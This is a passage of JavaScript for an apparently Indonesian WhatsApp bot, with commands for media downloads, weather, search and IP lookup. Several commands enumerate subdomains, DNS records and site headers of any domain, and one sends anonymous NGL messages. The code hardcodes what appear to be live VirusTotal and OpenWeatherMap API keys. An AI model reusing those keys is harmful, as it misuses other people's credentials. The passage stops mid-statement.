					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'spoiler':
			case 'hidetext':
			case 'readmore':
			case 'selengkapnya': {
				try {
					const more = String.fromCharCode(8206);
					const readMore = more.repeat(4001);
					let [l, r] = text.split('|');
					if (!l) l = '';
					if (!r) r = '';
					await vreden.sendMessage(m.chat, {
						text: l + readMore + r
					}, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'pastebin': {
				try {
					const teks = m.quoted ? m.quoted.text : text;
					if (!teks) return m.warning("*Masukan Teks!*")
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					const response = await createPaste(teks.split('|')[0] || '', teks);
					if (response.status === 0) {
						const pesan = `*Pesan Anda berhasil terkirim! 🚀*\n\n*Detail:*\n*Original:* ${response.original}\n*Raw:* ${response.raw}`;
						await vreden.sendMessage(m.chat, {
							text: pesan
						}, {
							quoted: m
						});
					} else {
						await vreden.sendMessage(m.chat, {
							text: 'Pesan Anda gagal terkirim. 🙁'
						}, {
							quoted: m
						});
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'pastegg': {
				try {
					const teks = m.quoted ? m.quoted.text : text;
					if (!teks) return m.warning("*Masukan Teks!*")
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					const response = await pasteGG(teks);
					if (response) {
						const pesan = `*Pesan Anda berhasil terkirim! 🚀*\n\n*Detail:*\n*URL:* ${response}`;
						await vreden.sendMessage(m.chat, {
							text: pesan
						}, {
							quoted: m
						});
					} else {
						await vreden.sendMessage(m.chat, {
							text: 'Pesan Anda gagal terkirim. 🙁'
						}, {
							quoted: m
						});
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ipwhois':
			case 'cekip':
			case 'whoisip': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} 144.0.283.11`)
				try {
					let res = await fetchJson(`https://ipwho.is/${text}?lang=id-ID`)
					const ip = res.ip
					const type = res.type
					const benua = res.continent
					const country = res.country
					const countrycode = res.country_code
					const wilayah = res.region
					const city = res.city
					const notlp = res.calling_code
					const ibukota = res.capital
					const perbatasan = res.borders
					const emoji = res.flag.emoji
					const latitude = res.latitude
					const longitude = res.longitude
					const org = res.connection.org
					const isp = res.connection.isp
					const dom = res.connection.domain
					vreden.sendMessage(m.chat, {
						location: {
							degreesLatitude: latitude,
							degreesLongitude: longitude,
							name: `IP From ${country} ${emoji}`,
							address: `${res.city}, ${res.region}, ${res.country}`
						}
					})
					await sleep(1000)
					m.sendForward(`• *IP* : ${ip}
• *Type IP* : ${res.type}
• *Benua* : ${res.continent}
• *Negara* : ${res.country} (${res.country_code})
• *Ibukota Negara* : ${res.capital}
• *Wilayah IP* : ${res.region}
• *Kota* : ${res.city}
• *Kode telpon* : +${res.calling_code}
• *Perbatasan* : ${res.borders}
• *Pemilik IP* : ${res.connection.org}
• *Provider* : ${res.connection.isp}
• *Domain* : ${dom}

> ${footxt}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekhp':
			case 'device': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} iPhone 13`)
				try {
					let data = await gsmarena.search.search(text)
					let teks = '*乂 DEVICE SEACRH*\n\n'
					for (let hasil of data) {
						teks += `*Name:* ${hasil.name}\n*Deskripsi:* ${hasil.description}\n\n─────────────────\n\n`
					}
					if (data.length < 3) {
						vreden.sendMessage(m.chat, {
							image: {
								url: data[0].img
							},
							caption: teks
						}, {
							quoted: m
						})
					}
					if (data.length > 2) {
						let button = [{
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"${data[0].name}\",\"id\":\".hpdetail ${data[0].id}\"}`
						}, {
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"${data[1].name}\",\"id\":\".hpdetail ${data[1].id}\"}`
						}, {
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"${data[2].name}\",\"id\":\".hpdetail ${data[2].id}\"}`
						}]
						vreden.sendButtonText(m.chat, button, teks, footer, m)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'hpdetail':
			case 'devicedetail': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} apple_iphone_13_pro_max-11089`)
				try {
					let data = await gsmarena.catalog.getDevice(text)
					let teks = `*乂 DEVICE DETAIL*\n\n*Name:* ${data.name}\n`
					for (let hasil of data.detailSpec) {
						teks += `\n*${pj}${hasil.category}:${pj}*\n`
						for (let sila of hasil.specifications) {
							teks += `*${sila.name}:* ${sila.value}\n`
						}
					}
					for (let sil of data.quickSpec) {
						teks += `*${pj}${sil.name}:${pj}* ${sil.value}\n`
					}
					await vreden.sendMessage(m.chat, {
						image: {
							url: data.img
						},
						caption: teks
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekhost':
			case 'checkhost': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let host = await axios.post(
						'https://check-host.cc/rest/V2/http', {
							'target': text,
							'apikey': 'NOKEY',
							'ClientIP': null
						}, {
							headers: {
								'accept': 'application/json',
								'Content-Type': 'application/json'
							}
						}
					);
					let idport = host.data.reportid
					await sleep(5000)
					let hostreport = await fetchJson(`https://check-host.cc/rest/V2/report/${idport}`)
					let teks = `*乂 CEK HOST WEB*\n\nID: ${idport}\n\n`;
					for (let x of hostreport.slaves) {
						teks += `- Server: ${x.server}
- Status: ${x.code}
- Ping: ${x.time ? x.time : "down"}\n────────────────────\n\n`
					}
					let tekss = teks.replace(/<span style="color: #ea5455;">/g, '').replace(/span>/g, '').replace(/[</]/g, '')
					m.sendForward(tekss)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'subdo':
			case 'subdomain':
			case 'ceksubdo': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
				if (budy.match(`/|https|http|:`)) return m.warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
				try {
					let domoi = await axios.get(`https://crt.sh/?q=${text}&output=json`, {
						headers: {
							'Content-Type': 'application/json'
						}
					});
					let dommi = await domoi.data
					let teks = `*乂 SUBDOMAIN CEK*\n\n`
					let t = []
					for (let n of dommi) {
						n.name_value.split("\n").map((v) => t.push(v));
					}
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					for (let x of [...new Set(t.filter((v) => !v.startsWith("*")))]) {
						teks += `*Subdo:* ${x}\n*DNS:* \n`
						let dnns = await dns.promises.resolve4(x).catch(async () => "-")
						var suom
						suom = dnns ? dnns.length : 0
						for (let i = 0; i < suom; i++) {
							teks += `- ${dnns[i] ? dnns[i] : "-"}\n`
						}
						teks += `\n────────────────────\n\n`
					}
					m.sendForward(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ngl':
			case 'sendngl': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
				if (!budy.match('https://ngl.link/')) return m.warning(`Contoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
				let [usersi, ...message] = text.split(' ');
				let userr = usersi.split('https://ngl.link/')[1]
				message = message.join(' ');
				try {
					let ngl = await axios.post("https://ngl.link/api/submit",
						`username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
					);
					m.sendForward(`*Pesan terkirim 🤓*

ID: ${ngl.data.questionId}
Region: ${ngl.data.userRegion}
`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'dns':
			case 'cekdns':
			case 'dnsrecord': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
				if (budy.match(`/|https|http|:`)) return m.warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const options = {
						method: 'GET',
						headers: {
							accept: 'application/json',
							'x-apikey': 'd8d56420a997b7372501df999e2fa9b6226c5864ccf509bf142c9f618fdca90c'
						}
					};
					let domain = await fetchJson(`https://www.virustotal.com/api/v3/domains/${text}/subdomains?limit=100`, options)
					let teks = `*乂 DOMAIN DNS CEK*\n\n`;
					for (let x of domain.data) {
						teks += `*Sub:* ${x.id}
*Type:* ${x.type}
*DNS Record:*\n\n`
						for (let p of x.attributes.last_dns_records) {
							teks += `- *Type:* ${p.type}
- *TTL:* ${p.ttl}
- *Value:* ${p.value}\n\n`;
						}
						teks += `\n────────────────────\n\n`
					}
					m.sendForward(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekweb': {
				if (!text) return m.warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
				if (budy.match(`/|https|http|:`)) return m.warning(`*Masukan Domain Saja!*\n\nContoh:\n${prefix + command} google.com`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})

				axios.get(`https://api.hackertarget.com/pagelinks/?q=${text}`)
					.then(async response => {
						const pageLinks = response.data;

						const dnsResponse = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${text}`);
						const dnsData = dnsResponse.data;

						const headerResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const headerData = headerResponse.data;

						const serverResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const serverData = serverResponse.data;

						let info = `*乂 DOMAIN CHECK*
            
*Extract Links*: 
${pageLinks.split("\n").map(link => `• ${link}`).join("\n")}

*DNS Recod*:
${dnsData}

*Headers Data*:
${headerData}

*Server Respon*:
${serverData}`;

						m.sendForward(info);
					})
					.catch(error => {
						console.error("Error fetching website info:", error);
						m.reply("Terjadi kesalahan saat mengambil informasi dari website yang dituju.");
					});
			}
			break
			case 'urlscan':
			case 'scanurl': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
				if (budy.match(`/|https|http|:`)) return m.warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await axios.get(`https://urlscan.io/api/v1/search/?q=${text}`)
					if (anu.data.total <= 1) return m.warning('Masukan link yang valid/aktif')
					let teks = `乂 DOMAIN CHECKER\n\n`;
					for (let x of anu.data.results) {
						teks += `*visibility:* ${x.task.visibility}
*method:* ${x.task.method}
*country:* ${x.page.country}
*ip:* ${x.page.ip}
*url:* ${x.page.url}
*sub domain:* ${x.page.ptr}\n\n────────────────────\n\n`;
					}
					m.sendForward(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ DOWNLOADER ]━━━━━━━━━━━━━━━━━//
			case 'spotifydl':
			case 'spotify':
			case 'spotifys':
			case 'spotifysearch': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} DJ melodi kane`)
				if (budy.match(`colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return m.tolak('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
				if (text.startsWith("https://open.spotify.com")) {
					try {
						let spotify = await spotifydl(text)
						await vreden.sendMessage(m.chat, {
							audio: {
								url: spotify.result.music
							},
							mimetype: 'audio/mpeg',
							contextInfo: {
								forwardingScore: 9999999,
								isForwarded: true,
								externalAdReply: {
									title: "乂 SPOTIFY - DOWNLOAD",
									body: `${spotify.result.author} - ${spotify.result.title}`,
									mediaType: 1,
									previewType: 0,
									renderLargerThumbnail: true,
									thumbnailUrl: spotify.result.thumb,
									sourceUrl: text
								}
							}
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				} else {
					let anu = await searchSpotifyTracks(text);
					let spotifyscard = []
					let no = 1
					let teks = `*乂 SPOTIFY SEARCH*\n\n${anu[0].name}\n\n*⌬ Music ID:* ${anu[0].id}\n*⌬ Artis:* ${anu[0].artists.map(v => v.name).join(', ')}\n\n`;
					for (let x of anu) {
						spotifyscard.push({
							title: `${no++}. ${x.name}`,
							rows: [{
								header: `[ Audio ] ${x.artists.map(v => v.name).join(', ')}`,
								title: `ID: ${x.id}`,
								description: `Link: ${x.external_urls.spotify}`,
								id: `.spotify ${x.external_urls.spotify}`,
							}]
						})
					}
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{\n  title: 'Search 🔎',\n  sections: ${JSON.stringify(spotifyscard)}\n}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: `https://api.vreden.my.id/api/spotifyimage?image=https://telegra.ph/file/eaa4ee777d5839f97f4c2.jpg&title=${anu[0].name}&author=Qioo Official&album=${anu[0].artists.map(v => v.name).join(', ')}`
					}, button, teks, footer, m)
				}
			}
			break
			case 'playsp':
			case 'spotifyplay':
			case 'playspotify': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} DJ melodi kane`)
				try {
					let anu = await searchSpotifyTracks(text)
					let anuu = anu[0]
					let spotify = await spotifydl(anuu.external_urls.spotify)
					await vreden.sendMessage(m.chat, {
						audio: {
							url: spotify.result.music
						},
						mimetype: 'audio/mpeg',
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: "乂 SPOTIFY - PLAY",
								body: `${spotify.result.author} - ${spotify.result.title}`,
								mediaType: 1,
								previewType: 0,
								renderLargerThumbnail: true,
								thumbnailUrl: spotify.result.thumb,
								sourceUrl: anuu.external_urls.spotify
							}
						}
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'yt':
			case 'play':
			case 'ytplay': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} DJ melodi kane`)
				if (budy.match(`colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return m.tolak('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
				var search = await ytdl.search(text);
				var data = search.results.filter(objek => objek.type === "video")
				var convert = data[0]
				if (!convert) return m.warning('Video/Audio Tidak Ditemukan')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
  "title": "Select Type🍟",
  "sections": [
    {
      "title": "Download Audio YouTube 🎧",
      "rows": [
        {
          "header": "Audio Download (64kbps) 👾",
          "title": "YouTube Audio Low Quality",
          "id": ".ytmp3 ${convert.url} 64"
        },
        {
          "header": "Audio Download (128kbps) 🌚",
          "title": "YouTube Audio Medium Quality",
          "id": ".ytmp3 ${convert.url} 128"
        },
        {
          "header": "Audio Download (192kbps) 🌝",
          "title": "YouTube Audio High Quality",
          "id": ".ytmp3 ${convert.url} 192"
        },
        {
          "header": "Audio Download (256kbps) 🍟",
          "title": "YouTube Audio Very High Quality",
          "id": ".ytmp3 ${convert.url} 256"
        },
        {
          "header": "Audio Download (320kbps) 💫",
          "title": "YouTube Audio Ultra Quality",
          "id": ".ytmp3 ${convert.url} 320"
        }
      ]
    },
    {
      "title": "Download Document Mp3 YouTube 🗃️",
      "rows": [
        {
          "header": "MP3 File Download (64kbps) 👾",
          "title": "YouTube MP3 File Low Quality",
          "id": ".ytdoc ${convert.url} 64"
        },
        {
          "header": "MP3 File Download (128kbps) 🌚",
          "title": "YouTube MP3 File Medium Quality",
          "id": ".ytdoc ${convert.url} 128"
        },
        {
          "header": "MP3 File Download (192kbps) 🌝",
          "title": "YouTube MP3 File High Quality",
          "id": ".ytdoc ${convert.url} 192"
        },
        {
          "header": "MP3 File Download (256kbps) 🍟",
          "title": "YouTube MP3 File Very High Quality",
          "id": ".ytdoc ${convert.url} 256"
        },
        {
          "header": "MP3 File Download (320kbps) 💫",
          "title": "YouTube MP3 File Ultra Quality",
          "id": ".ytdoc ${convert.url} 320"
        }
      ]
    },
    {
      "title": "Download Video YouTube 🔥",
      "rows": [
        {
          "header": "Video Download (144p) 👾",
          "title": "YouTube Video Low Quality",
          "id": ".ytmp4 ${convert.url} 144p"
        },
        {
          "header": "Video Download (240p) 🌚",
          "title": "YouTube Video Medium Quality",
          "id": ".ytmp4 ${convert.url} 240p"
        },
        {
          "header": "Video Download (360p) 🌝",
          "title": "YouTube Video High Quality",
          "id": ".ytmp4 ${convert.url} 360p"
        },
        {
          "header": "Video Download (480p) 🍟",
          "title": "YouTube Video Very High Quality",
          "id": ".ytmp4 ${convert.url} 480p"
        },
        {
          "header": "Video Download (720p) 💫",
          "title": "YouTube Video Ultra Quality",
          "id": ".ytmp4 ${convert.url} 720p"
        }
      ]
    }
  ]
}`
					}]
					let caption = `*${convert.title}*\n\n*⌬ Ext* : Play\n*⌬ ID* : ${convert.videoId}\n*⌬ Durasi* : ${convert.timestamp}\n*⌬ Upload* : ${convert.ago}\n*⌬ Link* : ${convert.url}\n\n\n_*Choose your type...*_`
					vreden.sendButtonImage(m.chat, {
						url: convert.thumbnail
					}, button, caption, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getvideo': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Contoh : ${prefix + command} 1`)
				if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
				let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
				if (!urls) return m.warning(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				downloadMp4(urls[text - 1])
			}
			break
			case 'getmusic': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Contoh : ${prefix + command} 1`)
				if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
				let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
				if (!urls) return m.warning(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				downloadMp3(urls[text - 1])
			}
			break
			case 'ytmp3':
			case 'yta':
			case 'ytaudio': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return m.warning('Link Kamu Salah!')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				downloadMp3(args[0], args[1])
			}
			break
			case 'ytmp3doc':
			case 'ytdoc':
			case 'ytdocument': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return m.warning('Link Kamu Salah!')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				downloadDoc(args[0], args[1])
			}
			break
			case 'ytmp4':
			case 'ytv':
			case 'ytvideo': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return m.warning('Link Kamu Salah!')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				downloadMp4(args[0], args[1])
			}
			break
			case 'yta2':
			case 'ytaudio2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				ytdlMp3(text)
			}
			break
			case 'ytv2':
			case 'ytvideo2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				ytdlMp4(text)
			}
			break
			case 'lk21': { //Fix Qioo
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Nyari Apa?`)
				m.reply(mess.wait)
				let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
				try {
					let json = await res.json()
					json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
					m.reply(json)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'jarak': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let [from, to] = text.split(/[^\w\s]/g)
					if (!(from && to)) return m.warning(`Contoh: ${prefix+command} jakarta|bandung`)
					let data = await jarak(from, to)
					if (data.img) return vreden.sendMessage(m.chat, {
						image: data.img,
						caption: data.desc
					}, {
						quoted: m
					})
					else m.reply(data.desc)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ramalancuaca':
			case 'cuacamendatang': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} Yogyakarta`)
				try {
					let teks = `*乂 RAMALAN CUACA*\n\n`
					const apiUrl = `https://api.openweathermap.org/data/2.5/forecast?q=${text}&appid=060a6bcfa19809c2cd4d97a212b19273&units=metric&cnt=${5 * 8}&lang=id`
					const response = await fetch(apiUrl);
					const data = await response.json();
					data.list.forEach((item, index) => {
						teks += `*Tanggal:* ${item.dt_txt}
*Cuaca:* ${item.weather[0].description}
*Temperatur:* ${item.main.temp}°C
*Kelembaban:* ${item.main.humidity}%
*Kecepatan angin:* ${item.wind.speed} m/s

────────────────────\n\n`
					});
					m.sendForward(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'infocuaca':
			case 'cuaca': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} Yogyakarta`)
				try {
					const response = axios.get(
						`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
					)
					const res = await response
					const lokasi_name = res.data.name
					const country = res.data.sys.country
					const weather = res.data.weather[0].description
					const icon = res.data.weather[0].icon
					const temperature = res.data.main.temp + "°C"
					const minimum_temperature = res.data.main.temp_min + "°C"
					const maximum_temperature = res.data.main.temp_max + "°C"
					const humidity = res.data.main.humidity + "%"
					const pressure = res.data.main.pressure + "HPa"
					const wind = res.data.wind.speed + "km/h"
					const teks = `*乂 WEATHER INFO*

• *Lokasi* : ${lokasi_name}
• *Country* : ${country}
• *Cuaca* : ${weather}
• *Suhu saat ini* : ${temperature}
• *Suhu tertinggi* : ${maximum_temperature}
• *Suhu terendah* : ${minimum_temperature}
• *Kelembapan* : ${humidity}
• *Angin* : ${wind}
• *Tekanan* : ${pressure}

> ${footxt}`
					const buffer = await getBuffer(`https://openweathermap.org/img/wn/${icon}@4x.png`)
					const contentText = {
						text: teks,
						contextInfo: {
							mentionedJid: ments(teks),
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								showAdAttribution: true,
								containsAutoReply: true,
								title: `${capitalizeWords(weather)}`,
								body: `${lokasi_name}`,
								previewType: "PHOTO",
								thumbnail: buffer,
								sourceUrl: "-"
							}
						}
					};
					vreden.sendMessage(m.chat, contentText, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'google': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} Indonesia`);
				try {
					let data = await fetchJson(`https://api.vreden.my.id/api/google?query=${text}`)
					let googlecard = []
					let teks = `*乂 GOOGLE ENGINE*\n\n- *Count Display:* 10\n- *Total Result:* ${data.result.searchInformation.formattedTotalResults}\n- *Fetch Data:* ${data.result.searchInformation.formattedSearchTime} ms\n\n`
					let res = data.result.items
					for (let g of res) {
						teks += `- *Title* : ${g.title}\n`;
						teks += `- *Link* : ${g.link}\n`;
						teks += `- *Snippet* : ${g.snippet}\n\n────────────────────\n\n`;
					}
					let jmlh = data.sugest.length
					for (let i = 0; i < jmlh; i++) {
						googlecard.push({
							header: 'Search Google:',
							title: data.sugest[i],
							id: '.google ' + data.sugest[i]
						})
					}
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{\n  title: 'Search Other 🔎',\n  sections: [\n    {\n      title: 'Telusuri Pencarian Terkait Topik',\n      highlight_label: 'Google Engine Dev',\n      rows: ${JSON.stringify(googlecard)}\n    }\n  ]\n}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: res[0].pagemap.cse_thumbnail[0].src
					}, button, teks, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'komikusearch':
			case 'komikus':
			case 'comics':
			case 'comicsearch': { //Fix Qioo
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} tensei`);
				async function searchKomiku(query) {
					const url = 'https://data.komiku.id/cari/?post_type=manga&s=' + query; // Ganti dengan URL pencarian yang sesuai

					try {
						const response = await fetch(url);
						const html = await response.text();
						const $ = cheerio.load(html);
						const results = [];

						$('div.daftar > div.bge').each((index, element) => {
							const imageSrc = $(element).find('.bgei img').attr('data-src');
							const link = $(element).find('.bgei a').attr('href');
							const title = $(element).find('.kan a h3').text().trim();
							const subtitle = $(element).find('.kan .judul2').text().trim();
							const update = $(element).find('.kan p').text().trim();

							const chapters = [];
							$(element).find('.kan .new1').each((idx, el) => {
								const chapterTitle = $(el).find('a').attr('title');
								const chapterNumber = $(el).find('span:last-child').text();
								chapters.push({
									title: chapterTitle,
									number: chapterNumber
								});
							});

							results.push({
								imageSrc: imageSrc || 'Tidak diketahui',
								link: link || 'Tidak diketahui',
								title: title || 'Tidak diketahui',
								subtitle: subtitle || 'Tidak diketahui',
								update: update || 'Tidak diketahui',
								chapters: chapters.length > 0 ? chapters.map(({
									title,
									number
								}, index) => `\n${index + 1}.\n${title}\n${number}\n\n`).join('') : 'Tidak diketahui'
							});
						});

						return results;
					} catch (error) {
						console.error(error);
						return [];
					}
				}
				try {
					let res = await searchKomiku(text)
					let teks = res.map((v, index) => {
						return `*[ ${index + 1} ]*
